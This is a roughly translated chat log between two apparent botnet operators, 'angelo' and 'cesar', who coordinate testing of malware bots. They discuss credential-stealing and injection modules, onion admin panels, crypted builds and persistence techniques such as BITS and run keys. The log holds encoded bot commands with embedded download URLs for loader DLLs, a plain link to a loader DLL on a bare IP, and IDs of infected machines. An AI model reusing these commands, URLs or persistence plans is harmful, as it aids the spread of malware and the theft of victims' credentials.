+[23.09.21 13:16:15] angelo:		AAAAAPwfGAnmrfLr32VYFV/MkBYppG5SzVp57FnguaKyXjRxJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADMAMgAuAGQAbABsAC7sFf7MqV17WtPDdYsZ9mNTzMT+Qp+limVb31YlmDvgGaFayQdRkUNW006fP/e/sTC8Exqb+D+vNeH67YrkviZT3p/YrtLglxBnnhkRbcUK1k+Sx30JeNzEiOalMOxDUA==
+[9/23/221 13:16:32] angelo: in the shower I don't know how to look (
+[23.09.21 13:16:33] cesar: sec, I'll encrypt it
+[9/23/221 13:16:39] angelo: wait
+[23.09.21 13:16:48] angelo: let's upload not logged
+[23.09.21 13:17:05] cesar:		AAAAAPwfGAnmrfLr32VYFV/MkBYppG5SzVp57FnguaKyXjRxJAAAAGgAdAB0AHAAOgAvAC8ANQAuADEAOAAxAC4AOAAwAC4AMQA1ADUALwBpAG0AYQBnAGUAcwAvAG0AbABiADMAMgAuAGQAbABsAIIIpy8f2f+wFjlP84g9HPcQ38TrE8ab7+hYMJinXQUVv671uGVz7RsMECHOopcF/uVse8hwQqB60y3SFGcR22gj4Bm9ZlYsYxY7oUcbjOjp9yb9JMF5v0jTgS71hM9UKw==
+[9/23/221 13:17:13] cesar: check with logs first
+[9/23/221 13:17:52] angelo: ok
+[23.09.21 14:06:01] angelo: 10 Start failed
+[23.09.21 14:06:02] angelo: no way
+[9/23/221 14:11:26] cesar: check now
+[23.09.21 14:13:20] angelo: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/18845960
+[23.09.21 14:25:47] cesar: can't load admin
+[23.09.21 14:25:54] cesar: is it working for you?
+[23.09.21 14:26:02] angelo: it works
+[23.09.21 14:26:06] angelo: but it's weird today
+[9/23/221 14:26:08] angelo: with pauses
+[23.09.21 16:26:40] angelo: listen, why modules are loading one by one ?
+[23.09.21 16:26:50] angelo: injectDll 2021-09-23 16:23:42.873404 start Success
+pwgrabb 2021-09-23 16:23:19.81257 sTart Success
+pwgrabc 2021-09-23 16:22:51.968653 sTart Success
+importDll 2021-09-23 16:22:27.692118 getdata
+importDll 2021-09-23 16:22:03.073969 getdata
+importDll 2021-09-23 16:10:04.989294 getdata
+importDll 2021-09-23 16:04:59.69637 getdata
+importDll 2021-09-23 16:04:34.09108 getdata
+networkDll 2021-09-23 15:56:01.925375 start
+networkDll 2021-09-23 15:55:42.772934 start
+[9/23/221 16:26:54] angelo: crowd
+[23.09.21 16:26:58] angelo: same import
+[23.09.21 16:29:48] cesar: buttons in admin
+[23.09.21 16:30:18] cesar: about start on 32bit bot, it looks like a bug in the bot
+[23.09.21 16:30:34] angelo: got it, wait
+[23.09.21 16:30:37] angelo: I'll text Basil
+[9/23/221 16:31:52] angelo: listen, what's a dero?
+[23.09.21 16:33:29] cesar: it is a server backend, that takes data from modules, dpost pads just point to it
+[23.09.21 16:33:59] angelo: that's the server
+[23.09.21 16:34:10] angelo: where the data are merged
+[9/23/221 16:34:11] angelo: got it
+[23.09.21 16:38:18] angelo: make a bot on kwwka...
+[23.09.21 16:38:20] angelo: test
+[23.09.21 16:38:27] angelo: def ask
+[9/23/221 16:39:08] cesar: okay.
+[23.09.21 16:39:26] angelo: what kind of cock bites def?)
+[23.09.21 16:41:30] cesar: poured on the panel
+[23.09.21 16:41:37] cesar: ttstt.bin
+[23.09.21 16:41:47] cesar: just don't take dll, it's on 3
+[23.09.21 16:41:47] angelo: ok
+[9/23/221 16:41:50] angelo: thanks
+[23.09.21 16:42:33] cesar: I don't know who bite, we can't solve the problem for a long time, apparently he gets fucked a little
+[23.09.21 16:51:17] angelo: and what group did you give ?
+[23.09.21 16:51:27] angelo: which one look in kwwka7
+[23.09.21 16:51:47] angelo: I only got tst* there
+[23.09.21 16:52:03] cesar: ttstt
+[23.09.21 16:52:13] angelo: got it
+[23.09.21 16:52:17] angelo: to def for access
+[23.09.21 16:52:32] cesar: you only have tst* ?
+[23.09.21 16:52:43] angelo: yeah
+[23.09.21 16:52:49] angelo: in the list of groups
+[23.09.21 16:52:50] cesar: let's get tst21
+[23.09.21 16:52:58] angelo: it's too late)
+[23.09.21 16:53:02] angelo: wrote to def
+[23.09.21 16:53:13] angelo: go ahead
+[23.09.21 16:53:16] angelo: )
+[23.09.21 16:53:19] angelo: I'll wait for him
+[23.09.21 16:53:20] cesar: pfrbye ctqxfc
+[23.09.21 16:53:23] cesar: I'll upload it soon
+[23.09.21 16:53:53] cesar: filled
+[23.09.21 16:54:00] angelo: shit
+[23.09.21 16:54:05] angelo: everyone should be so "soon"
+[27.09.21 17:43:31] angelo: hey bro!
+[27.09.21 17:43:40] angelo: just a reminder
+[27.09.21 17:43:55] angelo: don't forget about trik and 32 bit OS
+[27.09.21 17:44:20] cesar: hi, i remember
+[27.09.21 17:44:30] cesar: haven't solved the problem yet
+[27.09.21 17:44:33] cesar: but soon
+[27.09.21 17:45:05] angelo: ok, I'm just reminding !)
+[28.09.21 14:46:21] angelo: hi bro! just wondering, basil is asking when we can spambot roll 32 tricom....
+[28.09.21 14:48:33] cesar: hi, tomorrow morning we'll scroll
+[28.09.21 14:48:40] angelo: okay.
+[28.09.21 14:48:43] angelo: thanks.
+[30.09.21 15:20:33] angelo: here ?
+[30.09.21 15:20:43] angelo: that's where adam got bit
+[30.09.21 15:20:51] angelo: I don't know what bot I asked you for last
+[30.09.21 15:21:03] angelo: which admins is knocking
+[30.09.21 15:36:42] cesar: on 3?
+[30.09.21 15:36:49] angelo: found it
+[30.09.21 15:36:58] angelo: the last one you threw me for 21
+[30.09.21 15:37:19] cesar: tst1 was uploaded to the panel
+[30.09.21 15:37:36] cesar: and it can be used to run a 45 command
+[30.09.21 15:37:47] angelo: on 32 ?
+[30.09.21 15:37:51] cesar: yes
+[30.09.21 15:40:12] cesar: only there link is already rotten, send me new link, when you ready to run
+[30.09.21 15:40:33] angelo: I already ran that bot
+[30.09.21 15:40:39] angelo: on three cars
+[30.09.21 15:40:50] angelo: knocking at kwwka7
+[30.09.21 15:42:01] cesar: which one?
+[30.09.21 15:42:12] angelo: the one for group 21
+[30.09.21 15:42:19] angelo: threw it to me a couple days ago
+[30.09.21 15:42:21] cesar: no, it's old
+[30.09.21 15:42:24] angelo: when Adam asked
+[30.09.21 15:42:26] cesar: no good
+[30.09.21 15:42:30] angelo: bleep!
+[30.09.21 15:42:39] cesar: exactly for the second group you need for the test?
+[30.09.21 15:43:05] angelo: you need for zeus admin
+[30.09.21 15:44:14] cesar: ok, I'll put it on my panel
+[30.09.21 15:44:36] angelo: go ahead
+[30.09.21 15:48:27] cesar: fill
+[30.09.21 15:48:33] angelo: ok
+[30.09.21 16:20:54] angelo: tst21 this one ?
+[30.09.21 16:44:18] angelo: I got a trip on 7 gave me an error
+[30.09.21 16:44:45] angelo: started it and after a while got the window saying application will be closed (
+[30.09.21 16:48:27] cesar: is it when you run bot?
+[30.09.21 16:48:32] angelo: yeah
+[30.09.21 16:48:37] cesar: 7 64?
+[30.09.21 16:48:37] angelo: can be a sin
+[30.09.21 16:48:42] angelo: yeah
+[30.09.21 16:48:43] cesar: which file did you run?
+[30.09.21 16:48:52] angelo: tst21
+[30.09.21 16:49:03] cesar: okay, I'll check
+[30.09.21 16:49:04] angelo: on others normal
+[30.09.21 16:59:33] cesar: works so far, no errors
+[30.09.21 16:59:40] cesar: how long did the bot work?
+[30.09.21 16:59:48] cesar: right after you started it?
+[30.09.21 16:59:48] angelo: about 5 minutes
+[30.09.21 16:59:52] angelo: and it came out
+[30.09.21 16:59:59] angelo: 5 minutes after launch
+[30.09.21 17:00:02] cesar: send me the link to the bot
+[30.09.21 17:00:23] angelo: I'll see if it was dormant at all
+[30.09.21 17:00:55] angelo: funny but he was online
+[30.09.21 17:00:55] angelo: https://kwwka7ark3ynr7k7.onion/log/17422786
+[30.09.21 17:00:58] angelo: shit
+[30.09.21 17:01:03] angelo: and I already knocked out the car
+[30.09.21 17:01:41] cesar: maybe a module crashed
+[30.09.21 17:01:49] cesar: okay, I'll check the log
+[30.09.21 17:02:00] angelo: I don't know, I just see something and text it right away
+[30.09.21 17:02:03] angelo: just in case
+[30.09.21 17:02:18] angelo: I'm cursed to find bugs unknown to other users ))
+[30.09.21 17:02:39] cesar: yeah, fine, you're an accident )))
+[30.09.21 17:02:45] cesar: write it down
+[30.09.21 17:02:52] angelo: ))) ok
+[01.11.21 14:16:18] angelo: hello
+[09.11.21 09:32:20] cesar: 1
+[09.11.21 09:32:43] cesar: you got it?
+[09.11.21 09:32:50] cesar: i guess not
+[09.11.21 09:32:57] angelo: yesterday silkodom trik with uk
+[09.11.21 09:32:57] angelo: after rebooting machines, bots died
+[09.11.21 09:32:57] angelo: listen
+[09.11.21 09:32:57] angelo: what to do ?!
+[09.11.21 09:32:57] angelo: yes
+[09.11.21 09:33:20] cesar: 1
+[09.11.21 09:33:31] cesar: seems normal
+[09.11.21 09:33:38] cesar: repeat what you wrote
+[09.11.21 09:33:39] angelo: okay
+[09.11.21 09:33:51] angelo: yesterday i was running with silkodom
+[09.11.21 09:33:58] angelo: zev9 group
+[09.11.21 09:34:24] angelo: On one bot there was a double network launch
+On the second bot 62 pwgrabb delete
+After reboot bot died in both bk and trike
+[09.11.21 09:34:56] cesar: don't get it
+[09.11.21 09:35:08] cesar: i.e. after reboot bk did not start?
+[09.11.21 09:35:25] cesar: silk-trick is not registered
+[09.11.21 09:35:35] cesar: it is purely running in the bk process
+[09.11.21 09:35:55] cesar: after restarting it needs to be restarted and it will come with a different id
+[09.11.21 09:36:04] angelo: after reboot both bots died
+[09.11.21 09:36:10] angelo: after rebooting machines
+[09.11.21 09:36:45] cesar: and when one bot starts? does it work after reboot?
+[09.11.21 09:37:04] angelo: yes
+[09.11.21 09:37:08] angelo: shit
+[09.11.21 09:37:10] angelo: kinda yeah
+[09.11.21 09:37:13] angelo: late
+[09.11.21 09:37:20] cesar: shel can't affect that in any way
+[09.11.21 09:37:21] angelo: there was wind in his head
+[09.11.21 09:37:36] angelo: but the trick was dead for sure
+[09.11.21 09:38:18] cesar: look, it's a variant of shel tricks, it's without prescribing and saving to disk
+[09.11.21 09:38:34] cesar: it works purely in the bk process and dies along with the bk
+[09.11.21 09:38:54] cesar: it is needed to run necessary modules
+[09.11.21 09:39:18] cesar: after reboot or completion of uk, there will be no trike
+[09.11.21 09:39:40] cesar: if you need it, you have to start shell again through the tank
+[09.11.21 09:39:58] cesar: I hope I explained it popularly?
+[09.11.21 09:40:51] angelo: yeah
+[09.11.21 09:40:51] angelo: even very
+[09.11.21 09:41:00] cesar: the point is that in this case the trick shouldn't burn the bk
+[09.11.21 09:41:04] angelo: why is adam fucking around ?
+[09.11.21 09:41:23] angelo: the guys have a different kind of problem
+[09.11.21 09:41:30] angelo: they are running a tricks dll on uk
+[09.11.21 09:41:38] angelo: uk stays alive but tricks die
+[09.11.21 09:41:46] cesar: yes, i heard about that problem
+[09.11.21 09:41:59] angelo: it is the main survivability problem
+[09.11.21 09:42:09] angelo: why the hell is adam tied to shell ?
+[09.11.21 09:42:32] cesar: why there - can not understand, I have no uk, asked to explain and throw down the code as there is a start, until they did not throw down
+[09.11.21 09:43:01] angelo: okay, I'll check on mine
+[09.11.21 09:43:05] cesar: but it's strange, it starts and then crashes, it looks like a detector
+[09.11.21 09:43:05] angelo: and then to you ok ?
+[09.11.21 09:43:10] angelo: ask about the launch code from the box
+[09.11.21 09:43:12] cesar: okay.
+[09.11.21 09:43:49] angelo: I still don't understand, what's Adam's problem with shell... sometimes you can not understand him
+[09.11.21 09:48:45] cesar: shell just need to check that it works fine in uk
+[09.11.21 09:48:45] cesar: doesn't tamper with it
+[09.11.21 09:48:45] cesar: that the buk will not die along with the trik shell
+[09.11.21 09:48:56] cesar: i.e. you have to launch shell, run necessary modules, maybe vnc3Dll
+[09.11.21 09:49:06] cesar: and let it run
+[09.11.21 09:49:12] cesar: 4-8 hours
+[09.11.21 09:49:37] cesar: then reboot system several times
+[09.11.21 10:32:16] angelo: why not give me a shell with a fix trik ?
+[09.11.21 10:32:33] angelo: they need it to be latched ?
+[09.11.21 10:34:46] cesar: uk is fixed in the system
+[09.11.21 10:35:04] cesar: what's the reason to get caught and put a trike there as well?
+[09.11.21 10:35:32] cesar: as far as I specified, the uk lacks functionality, some tricks modules
+[09.11.21 10:35:51] angelo: got it
+[09.11.21 10:35:52] angelo: about the fix
+[09.11.21 10:36:50] angelo: so we want to completely switch to launch from the shel without the tricycle
+[09.11.21 10:38:32] cesar: that's the best option
+[09.11.21 11:49:45] angelo: ` 4-8 hours
+then reboot the system a few times
+`
+[09.11.21 11:49:59] angelo: what for to reboot if a trick without a fix ?
+[09.11.21 11:56:49] cesar: check tank
+[09.11.21 11:59:17] angelo: can you watch please
+[09.11.21 11:59:17] angelo: DESKTOP-52K69VQ_W10019043.5C975BA7B5377D179EF3F92D089984E9
+[09.11.21 11:59:20] angelo: alive or not
+[09.11.21 11:59:21] angelo: in black
+[09.11.21 11:59:23] angelo: I don't understand
+[09.11.21 11:59:57] cesar: sec
+[09.11.21 12:00:03] cesar: 2nd admin?
+[09.11.21 12:00:15] angelo: /kwwka7
+[09.11.21 12:02:21] cesar: i think it's pumping
+[09.11.21 12:02:32] cesar: module gaskets not good
+[09.11.21 12:04:53] angelo: so because of the gasket on the module died trike ?
+[09.11.21 12:15:54] angelo: two bots
+[09.11.21 12:15:59] angelo: DESKTOP-0D7ULR6_W10019042.7B9B16218E34284D2F3991CDDC325A19
+[09.11.21 12:16:05] angelo: DESKTOP-52K69VQ_W10019043.5C975BA7B5377D179EF3F92D089984E9
+[09.11.21 12:16:08] angelo: one is dead, the other is not
+[09.11.21 12:16:11] angelo: I need to understand why
+[09.11.21 12:32:14] cesar: accepted
+[09.11.21 14:06:23] angelo: bots started dying bro
+[09.11.21 14:06:25] angelo: zev9
+[10.11.21 13:58:24] cesar: 1
+[10.11.21 13:58:43] cesar: otr nrm
+[10.11.21 13:58:51] angelo: require bot developer to build with fixing
+check mount for survivability
+take the experience of uk developers on anchoring - for example, use BITS, as well as methods from here
+
+https://habr.com/ru/post/425177/
+http://www.hexacorn.com/blog/2017/01/28/beyond-good-ol-run-key-all-parts/
+
+choose chain-breaking anchoring methods
+first achieve the survivability of the bare bot without modules
+test for survivability with modules as a separate step
+[10.11.21 13:58:55] angelo: Silver wrote that
+[10.11.21 13:59:10] angelo: like Shell is better than ddla to run
+[10.11.21 13:59:12] cesar: yes, I read it, we'll deal with it
+[10.11.21 13:59:23] angelo: then there's a new trick
+[10.11.21 13:59:31] cesar: yeah, it was much better
+[10.11.21 13:59:34] angelo: and on and on, and I'm already fucking confused
+[10.11.21 13:59:50] cesar: i read
+[10.11.21 14:00:06] cesar: thanks, you did your job, if anything I'll write
+[10.11.21 14:00:34] angelo: okay.
+[10.11.21 14:00:38] angelo: I ran three bots
+[10.11.21 14:00:43] angelo: 2 in the trike is fine
+[10.11.21 14:00:49] angelo: I launched shell
+[10.11.21 14:00:54] angelo: I don't know who needs it or not
+[10.11.21 14:01:51] cesar: let them hang if you don't need cars
+[10.11.21 14:02:07] cesar: if you need them, time how much they worked and send me the id please
+[10.11.21 14:02:24] cesar: then you can turn it off
+[10.11.21 14:02:52] angelo: I have more than 10 of them with you already.
+[16.11.21 15:25:41] angelo: hi
+[16.11.21 15:31:09] angelo: here?
+[16.11.21 15:32:00] cesar: hi.
+[16.11.21 15:32:36] angelo: apr
+[16.11.21 15:32:41] cesar: 1
+[16.11.21 15:32:48] cesar: yeah, okay.
+[16.11.21 15:33:02] angelo: it works for you
+[16.11.21 15:33:10] angelo: kwwka7
+[16.11.21 15:33:10] angelo: ?
+[16.11.21 15:33:26] cesar: sec, I'll check.
+[16.11.21 15:34:01] cesar: no, doesn't even find such url
+[16.11.21 15:34:09] angelo: yes
+[16.11.21 15:34:19] angelo: do you have bot to another admin without autorun ?
+[16.11.21 15:34:50] cesar: let me look for it
+[16.11.21 15:40:22] angelo: who do I write for admin ?
+[16.11.21 15:42:11] cesar: adam
+[16.11.21 15:42:14] cesar: I'll write too
+[16.11.21 15:46:24] cesar: tst361 on the panel, crypto, but better def disable
+[16.11.21 15:46:51] angelo: are you still there ?
+[16.11.21 15:46:51] angelo: thanks
+[16.11.21 15:46:58] angelo: I have to start the ddla...
+[16.11.21 15:47:01] cesar: filled and uncrypted
+[16.11.21 15:47:04] angelo: I didn't try to start them
+[16.11.21 15:47:11] cesar: okay, I'll tell you how
+[16.11.21 15:47:35] angelo: find description = *for the tight one
+[16.11.21 15:47:40] angelo: =)
+[16.11.21 15:49:51] cesar: 49 command
+[16.11.21 15:50:09] cesar:		```AAAAAFzf4NCoCw9Vdj8ZdMVHSGacxPVqGpabdXGFZB3rzgHgLAAAAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA0ADYALgAxADkAOAAuADEAMgA4AC8ATABvAGEAZABlAHIAXwB6AHYAbwBfADkAMgAxADIANABfADEALgBkAGwAbABSJZssG6BbvSSWn3j2PFPvGd8FbneH5PvSOuOzsGrYZUIqHksniEK9pj7xz8RV4LB2huHZ0MHpIzoserOneGv2R8hDu/6rJ6CT/iDpkmQjm3l8cEm+LxK+wCBGad5HmLs= Q29udHJvbF9SdW5ETEw``
+[16.11.21 15:50:17] cesar: it's like an argument
+[16.11.21 15:50:53] angelo: wait, where do I put the dll?
+[16.11.21 15:51:55] cesar: it's already shoved onto the link
+[16.11.21 15:52:03] cesar: didn't adam send it to you?
+[16.11.21 15:52:17] cesar: http://198.46.198.128/Loader_zvo_92124_1.dll
+[16.11.21 15:52:20] cesar: this?
+[16.11.21 15:52:20] angelo: yeah
+[16.11.21 15:52:24] cesar: okay.
+[16.11.21 15:52:31] angelo: why don't you read my fortune too?)
+[16.11.21 15:52:39] angelo: you know everything
+[16.11.21 15:52:48] angelo: what is it?
+[16.11.21 15:52:53] cesar: he sent it to me too, I'm testing too
+[16.11.21 15:53:11] cesar: according to destiny, everything will be fucked up!
+[16.11.21 15:54:18] angelo: thanks dear!))
+[16.11.21 15:54:24] cesar:]
+[16.11.21 16:00:50] angelo: something's taking too long
+[16.11.21 16:00:55] angelo: started second car just in case
+[16.11.21 16:03:28] angelo: both crypt and non-crypt don't knock
+[16.11.21 16:04:22] cesar: sec
+[16.11.21 16:06:38] cesar: https://cceqv5ulg6fc44budf3a4s5kkrhprk5okjmdtgmo6xevj2p2sxnkh3id.onion/log/23548966
+[16.11.21 16:06:46] cesar: yours?
+[16.11.21 16:07:10] angelo: yes
+[16.11.21 16:07:10] angelo: just tapped
+[16.11.21 16:07:12] angelo: that took a long time
+[16.11.21 16:07:15] angelo: not used to it
+[16.11.21 16:07:25] cesar: the pads are bad
+[16.11.21 16:08:53] angelo: did def tell you what kind of dllca ?
+[16.11.21 16:08:56] angelo: where to look
+[16.11.21 16:09:25] cesar: the fuck he knows
+[16.11.21 16:09:34] cesar: write him down, let him look, maybe he'll knock
+[16.11.21 16:10:05] angelo: Def is so mysterious as always
+[11/23/221 07:42:36] angelo: hi!
+[11/23/221 07:43:18] cesar: hi.
+[23.11.21 07:44:08] angelo: Frank gave me the task
+[23.11.21 07:44:10] angelo: Go!
+[23.11.21 07:44:24] cesar: 1
+[23.11.21 07:44:36] angelo: need bots for two admins
+[23.11.21 07:44:48] angelo: you used to squawk
+[23.11.21 07:45:00] angelo: no autoloading
+[23.11.21 07:45:12] cesar: start modules via 61?
+[23.11.21 07:45:26] angelo: yeah
+[23.11.21 07:45:38] cesar: ok, I'll upload it soon
+[23.11.21 07:45:59] angelo: ok
+[23.11.21 07:46:02] angelo: thanks bro 1
+[11/23/221 07:46:04] angelo: !
+[23.11.21 08:07:37] cesar: tst261 and tst361
+[23.11.21 08:08:54] angelo: don't see
+[23.11.21 08:09:37] cesar: repeat
+[23.11.21 08:09:42] angelo: test
+[23.11.21 08:09:48] cesar: 1
+[23.11.21 08:10:06] angelo: ok
+[23.11.21 08:10:17] cesar: tst261 and tst361 are filled
+[23.11.21 08:10:36] angelo: thanks !!!
+[23.11.21 09:03:53] angelo: and what to run through ?
+[23.11.21 09:04:01] angelo: what point
+[23.11.21 09:04:04] angelo: remind me
+[23.11.21 09:22:03] angelo: does kwka7 work ?
+[23.11.21 11:12:24] angelo: kwwka7 working ?
+[23.11.21 11:12:31] angelo: and tell me how to start robber
+[23.11.21 11:12:32] angelo: now what
+[11/23/11/21 11:12:58] cesar: sec
+[23.11.21 11:13:22] cesar: https://qdc6fwwomnmokmup3zz25k2coxwb2vss7zs3ox4656jjuv5mam6acgyd.onion/
+[23.11.21 11:13:30] cesar: this is the new kwka
+[23.11.21 11:13:45] cesar: I don't get it from the grouper
+[23.11.21 11:14:28] angelo: pwgrabb start
+pwgrabc start
+[23.11.21 11:14:30] angelo: are they ?
+[23.11.21 11:14:34] angelo: did not change ?
